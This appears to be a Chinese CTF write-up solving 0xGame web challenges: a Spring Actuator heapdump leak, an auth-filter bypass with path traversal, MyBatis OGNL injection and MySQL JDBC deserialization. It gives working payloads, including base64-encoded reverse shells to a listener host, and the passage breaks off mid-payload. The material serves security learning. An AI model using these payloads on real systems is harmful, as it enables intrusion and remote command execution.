+<p>spring actuator 默认会把含有 password secret 之类关键词的变量的值改成星号, 防止敏感信息泄露</p>
+<p>但是我们可以通过 <code>/actuator/heapdump</code> 这个路由去导出 jvm 中的堆内存信息, 然后通过一定的查询得到 app.password 的明文</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/whwlsfb/JDumpSpider">https://github.com/whwlsfb/JDumpSpider</a></p>
+<p>使用内存分析工具解析<code>heapdump</code>文件</p>
+<div class="code-wrapper"><pre><code class="hljs asciidoc">java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump
+<span class="hljs-code">.........</span>
+<span class="hljs-code">OriginTrackedMapPropertySource</span>
+<span class="hljs-code">-------------</span>
+management.endpoints.web.exposure.include = *
+server.port = null
+management.endpoints.web.exposure.exclude = shutdown,refresh,restart
+app.password = 0xGame&#123;1abbac75-e230-4390-9148-28c71e0098b9&#125;
+app.username = flag_is_the_password
+
+......</code></pre></div>
+
+<h2 id="auth-bypass"><a href="#auth-bypass" class="headerlink" title="auth_bypass"></a>auth_bypass</h2><p>主要考察对war包结构的认识</p>
+<p>题目附件给了 AuthFilter.java 和 DownloadServlet.java</p>
+<div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//AuthFilter.java</span>
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest req, ServletResponse resp, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;
+    <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> (HttpServletRequest)req;
+    <span class="hljs-keyword">if</span> (request.getRequestURI().contains(<span class="hljs-string">&quot;..&quot;</span>)) &#123;
+        resp.getWriter().write(<span class="hljs-string">&quot;blacklist&quot;</span>);
+    &#125; <span class="hljs-keyword">else</span> &#123;
+        <span class="hljs-keyword">if</span> (request.getRequestURI().startsWith(<span class="hljs-string">&quot;/download&quot;</span>)) &#123;
+            resp.getWriter().write(<span class="hljs-string">&quot;unauthorized access&quot;</span>);
+        &#125; <span class="hljs-keyword">else</span> &#123;
+            chain.doFilter(req, resp);
+        &#125;
+
+    &#125;
+&#125;</code></pre></div>
+
+<div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//DownloadServlet.java</span>
+<span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> IOException &#123;
+    <span class="hljs-type">String</span> <span class="hljs-variable">currentPath</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getServletContext().getRealPath(<span class="hljs-string">&quot;/assets/&quot;</span>);
+    <span class="hljs-type">Object</span> <span class="hljs-variable">fileNameParameter</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;filename&quot;</span>);
+    <span class="hljs-keyword">if</span> (fileNameParameter != <span class="hljs-literal">null</span>) &#123;
+        <span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> (String)fileNameParameter;
+        resp.setHeader(<span class="hljs-string">&quot;Content-Disposition&quot;</span>, <span class="hljs-string">&quot;attachment;filename=&quot;</span> + fileName);
+        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(currentPath + fileName);
+        <span class="hljs-type">Throwable</span> <span class="hljs-variable">var7</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
+
+        <span class="hljs-keyword">try</span> &#123;
+            <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">4096</span>];
+
+            <span class="hljs-keyword">while</span>(input.read(buffer) != -<span class="hljs-number">1</span>) &#123;
+                resp.getOutputStream().write(buffer);
+            &#125;
+        &#125; <span class="hljs-keyword">catch</span> (Throwable var16) &#123;
+            var7 = var16;
+            <span class="hljs-keyword">throw</span> var16;
+        &#125; <span class="hljs-keyword">finally</span> &#123;
+            <span class="hljs-keyword">if</span> (input != <span class="hljs-literal">null</span>) &#123;
+                <span class="hljs-keyword">if</span> (var7 != <span class="hljs-literal">null</span>) &#123;
+                    <span class="hljs-keyword">try</span> &#123;
+                        input.close();
+                    &#125; <span class="hljs-keyword">catch</span> (Throwable var15) &#123;
+                        var7.addSuppressed(var15);
+                    &#125;
+                &#125; <span class="hljs-keyword">else</span> &#123;
+                    input.close();
+                &#125;
+            &#125;
+
+        &#125;
+    &#125; <span class="hljs-keyword">else</span> &#123;
+        resp.setContentType(<span class="hljs-string">&quot;text/html&quot;</span>);
+        resp.getWriter().write(<span class="hljs-string">&quot;&lt;a href=\&quot;/download?filename=avatar.jpg\&quot;&gt;avatar.jpg&lt;/a&gt;&quot;</span>);
+    &#125;
+
+&#125;</code></pre></div>
+
+
+
+<p>DownloadServlet 很明显存在任意文件下载, 但是 AuthFilter 限制不能访问 <code>/download</code> 路由</p>
+<div class="code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-keyword">if</span> (request.get<span class="hljs-constructor">RequestURI()</span>.contains(<span class="hljs-string">&quot;..&quot;</span>)) &#123;    resp.get<span class="hljs-constructor">Writer()</span>.write(<span class="hljs-string">&quot;blacklist&quot;</span>);    return; &#125; <span class="hljs-keyword">if</span> (request.get<span class="hljs-constructor">RequestURI()</span>.starts<span class="hljs-constructor">With(<span class="hljs-string">&quot;/download&quot;</span>)</span>) &#123;    resp.get<span class="hljs-constructor">Writer()</span>.write(<span class="hljs-string">&quot;unauthorized access&quot;</span>); &#125; <span class="hljs-keyword">else</span> &#123;    chain.<span class="hljs-keyword">do</span><span class="hljs-constructor">Filter(<span class="hljs-params">req</span>, <span class="hljs-params">resp</span>)</span>; &#125;</code></pre></div>
+
+<p>根据网上的文章可以知道, 直接通过 getRequestURI() 得到的 url 路径存在一些问题, 比如不会自动 urldecode, 也不会进行标准化 (去除多余的 <code>/</code> 和 <code>..</code>)</p>
+<p>这里 <code>..</code> 被过滤了, 所以直接访问 <code>//download</code> 就能绕过, 后面目录穿越下载文件的时候可以将 <code>..</code> 进行一次 url 编码</p>
+<p>然后可以通过 <code>//download?filename=avatar.jpg</code> 下载文件, 但是无法读取 <code>/flag</code> (提示 Permission denied), 那么很明显需要 RCE</p>
+<p>根据题目描述, 网站使用 war 打包</p>
+<p>存在一个 WEB-INF 目录, 目录里面包含编译好的 .class 文件以及 web.xml</p>
+<div class="code-wrapper"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>download?filename=%<span class="hljs-number">2</span>e%<span class="hljs-number">2</span>e<span class="hljs-regexp">/WEB-INF/</span>web.xml</code></pre></div>
+
+<div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span>
+	<span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>EvilServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span>
+	<span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.example.demo.EvilServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span>
+
+<span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span>
+	<span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>EvilServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span>
+	<span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/You_Find_This_Evil_Servlet_a76f02cb8422<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span></code></pre></div>
+
+<div class="code-wrapper"><pre><code class="hljs gdscript3">//download?filename=%2e%2e/WEB-INF/classes/com/example/demo/EvilServlet.class</code></pre></div>
+
+<div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;
+<span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;
+<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;
+<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;
+
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;
+  <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> IOException &#123;
+    <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;Evil_Cmd_Arguments_fe37627fed78&quot;</span>);
+    <span class="hljs-keyword">try</span> &#123;
+      Runtime.getRuntime().exec(cmd);
+      resp.getWriter().write(<span class="hljs-string">&quot;success&quot;</span>);
+    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;
+      resp.getWriter().write(<span class="hljs-string">&quot;error&quot;</span>);
+    &#125; 
+  &#125;
+&#125;</code></pre></div>
+
+<div class="code-wrapper"><pre><code class="hljs fallback">POST /You_Find_This_Evil_Servlet_a76f02cb8422 HTTP/1.1
+Host: 127.0.0.1:50042
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 143
+
+Evil_Cmd_Arguments_fe37627fed78=bash+-c+&#123;echo,YmFzaCAtaSA%2bJiAvZGV2L3RjcC9ob3N0LmRvY2tlci5pbnRlcm5hbC80NDQ0IDA%2bJjE%3d&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code></pre></div>
+
+<p><img src="/../images/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/image-20231122210609455.png" srcset="/img/loading.gif" lazyload alt="image-20231122210609455"></p>
+<h2 id="YourBatis"><a href="#YourBatis" class="headerlink" title="YourBatis"></a>YourBatis</h2><p>自己看时并没看出什么，感觉只有长得奇怪的SQL查询</p>
+<p>看wp，是动态SQL</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnpanda.net/sec/1227.html">https://www.cnpanda.net/sec/1227.html</a></p>
+<p>mybatis组件的动态SQL会导致<code>OGNL注入</code></p>
+<ul>
+<li>@Insert</li>
+<li>@Update</li>
+<li>@Delete</li>
+<li>@Select</li>
+<li>@InsertProvider</li>
+<li>@SelectProvider</li>
+<li>@UpdateProvider</li>
+<li>@DeleteProvider</li>
+</ul>
+<h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><ul>
+<li>mybatis-spring-boot-starter &gt;&#x3D;2.0.1（mybatis-spring-boot-starter组件从2.0.1版本开始支持Provider动态SQL）</li>
+</ul>
+<p>或者</p>
+<ul>
+<li>Mybatis 全版本</li>
+</ul>
+<p>或者</p>
+<ul>
+<li>mybatis-plus-boot-starter &gt;&#x3D;3.1.1</li>
+</ul>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>mybatis中存在某个SelectProvider</p>
+<div class="code-wrapper"><pre><code class="hljs typescript">  <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">findTeacherByName</span>(<span class="hljs-params"><span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, <span class="hljs-built_in">Object</span>&gt; map</span>) &#123;
+        <span class="hljs-title class_">String</span> name = (<span class="hljs-title class_">String</span>) map.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;name&quot;</span>);
+        <span class="hljs-title class_">String</span> s = <span class="hljs-keyword">new</span> <span class="hljs-title function_">SQL</span>(<span class="hljs-params"></span>) &#123;
+            &#123;
+                <span class="hljs-title function_">SELECT</span>(returnSql);
+                <span class="hljs-title function_">FROM</span>(<span class="hljs-string">&quot;Teacher&quot;</span>);
+                <span class="hljs-title function_">WHERE</span>(<span class="hljs-string">&quot;name=&quot;</span> + name);
+            &#125;
+        &#125;.<span class="hljs-title function_">toString</span>();
+        <span class="hljs-keyword">return</span> s;
+    &#125;
+&#125;</code></pre></div>
+
+<div class="code-wrapper"><pre><code class="hljs reasonml">@<span class="hljs-constructor">RequestMapping(<span class="hljs-string">&quot;selectUserByName&quot;</span>)</span>
+public Teacher get<span class="hljs-constructor">UserOne(String <span class="hljs-params">id</span>,String <span class="hljs-params">name</span>)</span>&#123;
+
+    Teacher tea=<span class="hljs-keyword">new</span> <span class="hljs-constructor">Teacher()</span>;
+    tea.set<span class="hljs-constructor">Id(<span class="hljs-params">id</span>)</span>;
+    tea.set<span class="hljs-constructor">Name(<span class="hljs-params">name</span>)</span>;
+    Teacher teacher=userService.find<span class="hljs-constructor">TeacherByName(<span class="hljs-params">tea</span>)</span>;
+    return teacher;
+
+&#125;
+
+</code></pre></div>
+
+<div class="code-wrapper"><pre><code class="hljs llvm"><span class="hljs-symbol">http:</span>//localhost:<span class="hljs-number">8080</span>/selectUserByName?id<span class="hljs-operator">=</span><span class="hljs-number">7</span>&amp;name<span class="hljs-operator">=</span><span class="hljs-variable">%24</span><span class="hljs-variable">%7</span>B<span class="hljs-title">@java.lang.Runtime</span><span class="hljs-title">@getRuntime</span>().exec(<span class="hljs-string">&quot;calc&quot;</span>)<span class="hljs-variable">%7</span>D
+
+//$&#123;<span class="hljs-title">@java.lang.Runtime</span><span class="hljs-title">@getRuntime</span>().exec(<span class="hljs-string">&quot;calc&quot;</span>)&#125;</code></pre></div>
+
+<p>java环境大于等于jdk9的通杀payload</p>
+<div class="code-wrapper"><pre><code class="hljs autoit">$&#123;<span class="hljs-symbol">@jdk</span>.jshell.JShell<span class="hljs-symbol">@create</span>().<span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;java.lang.Runtime.getRuntime().exec(&quot;open /System/Applications/Calculator.app&quot;)&#x27;</span>)&#125;</code></pre></div>
+
+
+
+<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.yourbatis.provider;
+
+<span class="hljs-keyword">import</span> org.apache.ibatis.jdbc.SQL;
+
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserSqlProvider</span> &#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-title function_">UserSqlProvider</span><span class="hljs-params">()</span> &#123;
+    &#125;
+
+    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">buildGetUsers</span><span class="hljs-params">()</span> &#123;
+        <span class="hljs-keyword">return</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">SQL</span>() &#123;
+            &#123;
+                <span class="hljs-built_in">this</span>.SELECT(<span class="hljs-string">&quot;*&quot;</span>);
+                <span class="hljs-built_in">this</span>.FROM(<span class="hljs-string">&quot;users&quot;</span>);
+            &#125;
+        &#125;).toString();
+    &#125;
+
+    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">buildGetUserByUsername</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String username)</span> &#123;
+        <span class="hljs-keyword">return</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">SQL</span>() &#123;
+            &#123;
+                <span class="hljs-built_in">this</span>.SELECT(<span class="hljs-string">&quot;*&quot;</span>);
+                <span class="hljs-built_in">this</span>.FROM(<span class="hljs-string">&quot;users&quot;</span>);
+                <span class="hljs-built_in">this</span>.WHERE(String.format(<span class="hljs-string">&quot;username = &#x27;%s&#x27;&quot;</span>, username));
+            &#125;
+        &#125;).toString();
+    &#125;
+&#125;</code></pre></div>
+
+<div class="code-wrapper"><pre><code class="hljs elixir"><span class="hljs-variable">$&#123;</span><span class="hljs-variable">@java</span>.lang.<span class="hljs-title class_">Runtime</span><span class="hljs-variable">@getRuntime</span>().exec(<span class="hljs-string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9ob3N0LmRvY2tlci5pbnRlcm5hbC80NDQ0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>)&#125;</code></pre></div>
+
+<p>但是很显然是会失败的, 因为传入的命令包含了 <code>&#123;</code> 和 <code>&#125;</code>, 会被递归解析为另一个 OGNL 表达式的开头和结尾</p>
+<p>这个点可能比较难, 所以后面给出了 hint</p>
+<p>解决方案是只要不出现大括号就行, 方法很多, 这里给出一种, 利用 OGNL 调用 Java 自身的 base64 decode 方法</p>
+<div class="code-wrapper"><pre><code class="hljs stylus">$&#123;@java<span class="hljs-selector-class">.lang</span>.Runtime@<span class="hljs-built_in">getRuntime</span>()<span class="hljs-selector-class">.exec</span>(new java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.String</span>(@java<span class="hljs-selector-class">.util</span>.Base64@<span class="hljs-built_in">getDecoder</span>()<span class="hljs-selector-class">.decode</span>(<span class="hljs-string">&#x27;YmFzaCAtYyB7ZWNobyxZbUZ6YUNBdGFTQStKaUF2WkdWMkwzUmpjQzh4TVRndU9Ea3VOakV1TnpFdk56YzNOeUF3UGlZeH18e2Jhc2U2NCwtZH18e2Jhc2gsLWl9&#x27;</span>)))&#125;</code></pre></div>
+
+<p><img src="/../images/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/image-20231122224919226.png" srcset="/img/loading.gif" lazyload alt="image-20231122224919226"></p>
+<h2 id="TestConnect"><a href="#TestConnect" class="headerlink" title="TestConnect"></a>TestConnect</h2><p>怎么说呢，一直听说jdbc，但现在还是感到无力</p>
+<blockquote>
+<p>JDBC 就是 Java 用于操作数据库的接口, 通过一个统一规范的 JDBC 接口可以实现同一段代码兼容不同类型数据库的访问</p>
+<p>JDBC URL 就是用于连接数据库的字符串, 格式为 <code>jdbc:db-type://host:port/db-name?param=value</code></p>
+<p>db-type 就是数据库类型, 例如 postgresql, mysql, mssql, oracle, sqlite</p>
+<p>db-name 是要使用的数据库名</p>
+<p>param 是要传入的参数, 比如 user, password, 指定连接时使用的编码类型等等</p>
+<p>当 jdbc url 可控时, 如果目标网站使用了旧版的数据库驱动, 在特定情况下就可以实现 RCE</p>
+<p>参考文章:</p>
+<p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1877/">https://tttang.com/archive/1877/</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11812">https://xz.aliyun.com/t/11812</a></p>
+<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/1339">https://forum.butian.net/share/1339</a></p>
+<p>pom.xml</p>
+<div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.0.11<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>runtime<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
+
+<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
+
+<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.postgresql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>postgresql<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>42.3.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>runtime<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span></code></pre></div>
+
+<p>给了两个依赖, mysql 和 postgresql, 对应两种利用方式</p>
+<p>然后还有 commons-collections 依赖, 这个主要是方便大家在后面用 ysoserial 工具去生成反序列化 payload</p>
+<p>首先是 mysql 驱动的利用</p>
+<p>结合网上文章可以构造对应的 jdbc url</p>
+<div class="code-wrapper"><pre><code class="hljs bash">jdbc:mysql://host.docker.internal:3308/test?autoDeserialize=<span class="hljs-literal">true</span>&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor</code></pre></div>
+
+<p>首先得注意, 因为题目给的代码是 <code>DriverManager.getConnection(url, username, password);</code>, 即会单独传入一个 username 参数, 因此 url 中的 username 会被后面的 username 给覆盖</p>
+<p>网上的部分利用工具会通过 username 来区分不同的 payload, 所以得注意 username 要单独传, 不然写在 url 里面就被覆盖了</p>
+<p>其次, 因为 jdbc url 本身也符合 url 的规范, 所以在传 url 参数的时候, 需要把 url 本身全部进行 url 编码, 防止服务器错把 autoDeserialize, queryInterceptors 这些参数当成是一个 http get 参数, 而不是 jdbc url 里面的参数</p>
+<p>最后依然是 Runtime.exec 命令编码的问题</p>
+<p>一些 mysql jdbc 利用工具</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/4ra1n/mysql-fake-server">https://github.com/4ra1n/mysql-fake-server</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/rmb122/rogue_mysql_server">https://github.com/rmb122/rogue_mysql_server</a></p>
+<p>payload</p>
+<div class="code-wrapper"><pre><code class="hljs bash">/testConnection?driver=com.mysql.cj.jdbc.Driver&amp;url=jdbc:mysql://host.docker.internal:3308/test?autoDeserialize=<span class="hljs-literal">true</span>&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;username=deser_CC31_bash -c &#123;<span class="hljs-built_in">echo</span>,YmFzaCAtaSA+JiAvZGV2L3RjcC9ob3N0LmRvY2tlci5pbnRlcm5hbC80NDQ0IDA+JjE=&#125;|&#123;<span class="hljs-built_in">base64</span>,-d&#125;|&#123;bash,-i&#125;&amp;password=123</code></pre></div>
+
+<p>url 编码</p>
+<div class="code-wrapper"><pre><code class="hljs llvm">/testConnection?driver<span class="hljs-operator">=</span>com.mysql.cj.jdbc.Driver&amp;url<span class="hljs-operator">=</span><span class="hljs-variable">%6</span>a<span class="hljs-variable">%64</span><span class="hljs-variable">%62</span><span class="hljs-variable">%63</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%6</span>d<span class="hljs-variable">%79</span><span class="hljs-variable">%73</span><span class="hljs-variable">%71</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%2</span>f<span class="hljs-variable">%2</span>f<span class="hljs-variable">%68</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%73</span><span class="hljs-variable">%74</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%64</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>b<span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%61</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%33</span><span class="hljs-variable">%33</span><span class="hljs-variable">%30</span><span class="hljs-variable">%38</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%73</span><span class="hljs-variable">%74</span><span class="hljs-variable">%3</span>f<span class="hljs-variable">%61</span><span class="hljs-variable">%75</span><span class="hljs-variable">%74</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%44</span><span class="hljs-variable">%65</span><span class="hljs-variable">%73</span><span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%69</span><span class="hljs-variable">%61</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%69</span><span class="hljs-variable">%7</span>a<span class="hljs-variable">%65</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%74</span><span class="hljs-variable">%72</span><span class="hljs-variable">%75</span><span class="hljs-variable">%65</span><span class="hljs-variable">%26</span><span class="hljs-variable">%71</span><span class="hljs-variable">%75</span><span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%79</span><span class="hljs-variable">%49</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%63</span><span class="hljs-variable">%65</span><span class="hljs-variable">%70</span><span class="hljs-variable">%74</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%72</span><span class="hljs-variable">%73</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>d<span class="hljs-variable">%2</span>e<span class="hljs-variable">%6</span>d<span class="hljs-variable">%79</span><span class="hljs-variable">%73</span><span class="hljs-variable">%71</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>a<span class="hljs-variable">%2</span>e<span class="hljs-variable">%6</span>a<span class="hljs-variable">%64</span><span class="hljs-variable">%62</span><span class="hljs-variable">%63</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%63</span><span class="hljs-variable">%65</span><span class="hljs-variable">%70</span><span class="hljs-variable">%74</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%72</span><span class="hljs-variable">%73</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%53</span><span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%76</span><span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%53</span><span class="hljs-variable">%74</span><span class="hljs-variable">%61</span><span class="hljs-variable">%74</span><span class="hljs-variable">%75</span><span class="hljs-variable">%73</span><span class="hljs-variable">%44</span><span class="hljs-variable">%69</span><span class="hljs-variable">%66</span><span class="hljs-variable">%66</span><span class="hljs-variable">%49</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%63</span><span class="hljs-variable">%65</span><span class="hljs-variable">%70</span><span class="hljs-variable">%74</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%72</span>&amp;username<span class="hljs-operator">=</span><span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%73</span><span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%43</span><span class="hljs-variable">%43</span><span class="hljs-variable">%33</span><span class="hljs-variable">%31</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%62</span><span class="hljs-variable">%61</span><span class="hljs-variable">%73</span><span class="hljs-variable">%68</span><span class="hljs-variable">%20</span><span class="hljs-variable">%2</span>d<span class="hljs-variable">%63</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%65</span><span class="hljs-variable">%63</span><span class="hljs-variable">%68</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%59</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%46</span><span class="hljs-variable">%7</span>a<span class="hljs-variable">%61</span><span class="hljs-variable">%43</span><span class="hljs-variable">%41</span><span class="hljs-variable">%74</span><span class="hljs-variable">%61</span><span class="hljs-variable">%53</span><span class="hljs-variable">%41</span><span class="hljs-variable">%2</span>b<span class="hljs-variable">%4</span>a<span class="hljs-variable">%69</span><span class="hljs-variable">%41</span><span 